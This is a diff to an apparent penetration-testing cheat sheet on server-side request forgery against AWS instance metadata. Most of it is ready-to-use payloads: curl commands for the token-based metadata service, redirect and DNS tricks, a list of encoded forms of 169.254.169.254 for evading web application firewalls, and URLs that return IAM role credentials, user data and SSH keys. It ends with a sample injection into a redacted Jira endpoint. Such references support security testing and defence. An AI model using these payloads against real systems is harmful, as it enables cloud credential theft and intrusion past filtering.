@@ -545,76 +545,79 @@ Example of a PDF attachment using HTML
 
 ## SSRF URL for Cloud Instances
 
-### SSRF URL for AWS Bucket
+### SSRF URL for AWS
 
-[Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
-Interesting path to look for at `http://169.254.169.254` or `http://instance-data`
+The AWS Instance Metadata Service is a service available within Amazon EC2 instances that allows those instances to access metadata about themselves. - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
 
+
+* Old endpoint: `http://169.254.169.254/latest/meta-data/`
+* New endpoint requires the header `X-aws-ec2-metadata-token`
+  ```powershell
+  export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
+  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
+  ```
+
+In case of a WAF, you might want to try different ways to connect to the API.
+* DNS record pointing to the AWS API IP
+  ```powershell
+  http://instance-data
+  http://169.254.169.254
+  http://169.254.169.254.nip.io/
+  ```
+* HTTP redirect
+  ```powershell
+  Static:http://nicob.net/redir6a
+  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+  ```
+* Encoding the IP to bypass WAF
+  ```powershell
+  http://425.510.425.510 Dotted decimal with overflow
+  http://2852039166 Dotless decimal
+  http://7147006462 Dotless decimal with overflow
+  http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
+  http://0xA9FEA9FE Dotless hexadecimal
+  http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
+  http://0251.0376.0251.0376 Dotted octal
+  http://0251.00376.000251.0000376 Dotted octal with padding
+  http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
+  http://[::ffff:a9fe:a9fe] IPV6 Compressed
+  http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
+  http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
+  ```
+
+
+These URLs return a list of IAM roles associated with the instance. You can then append the role name to this URL to retrieve the security credentials for the role.
 ```powershell
-Always here : /latest/meta-data/{hostname,public-ipv4,...}
-User data (startup script for auto-scaling) : /latest/user-data
-Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+
+# Examples
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
 ```
 
-DNS record
-
-```powershell
-http://instance-data
-http://169.254.169.254
-http://169.254.169.254.nip.io/
-```
-
-HTTP redirect
-
-```powershell
-Static:http://nicob.net/redir6a
-Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
-```
-
-Alternate IP encoding
-
-```powershell
-http://425.510.425.510/ Dotted decimal with overflow
-http://2852039166/ Dotless decimal
-http://7147006462/ Dotless decimal with overflow
-http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
-http://0xA9FEA9FE/ Dotless hexadecimal
-http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
-http://0251.0376.0251.0376/ Dotted octal
-http://0251.00376.000251.0000376/ Dotted octal with padding
-http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
-```
-
-More urls to include
-
+This URL is used to access the user data that was specified when launching the instance. User data is often used to pass startup scripts or other configuration information into the instance.
 ```powershell
 http://169.254.169.254/latest/user-data
-http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+```
+
+Other URLs to query to access various pieces of metadata about the instance, like the hostname, public IPv4 address, and other properties.
+```powershell
 http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
 http://169.254.169.254/latest/meta-data/ami-id
 http://169.254.169.254/latest/meta-data/reservation-id
 http://169.254.169.254/latest/meta-data/hostname
 http://169.254.169.254/latest/meta-data/public-keys/
 http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
 http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
-http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
-http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
 http://169.254.169.254/latest/dynamic/instance-identity/document
-```
-
-AWS SSRF Bypasses
-```
-Converted Decimal IP: http://2852039166/latest/meta-data/
-IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
-IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
-IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
 ```
 
 E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
 
 E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
+
 
 ### SSRF URL for AWS ECS
 
